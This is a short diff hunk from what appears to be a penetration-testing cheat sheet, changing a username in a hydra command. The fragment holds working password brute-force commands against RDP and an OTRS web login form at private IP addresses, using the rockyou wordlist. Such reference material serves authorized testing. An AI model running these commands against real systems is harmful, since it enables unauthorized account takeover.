@@ -168,7 +168,7 @@ RDP
 hydra -t 1 -l username -p password1! rdp://192.168.190.130
 
 OTRS
-hydra -l user -P /usr/share/wordlists/rockyou.txt  192.168.0.1 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-
+hydra -l user_admin -P /usr/share/wordlists/rockyou.txt  192.168.0.1 http-post-form "/otrs/index.pl:Action=Login&RequestedURL=&Lang=en&TimeOffset=-
 120&User=^USER^&Password=^PASS^:F=Login failed! Your user name or password was entered incorrectly." -I
 
 
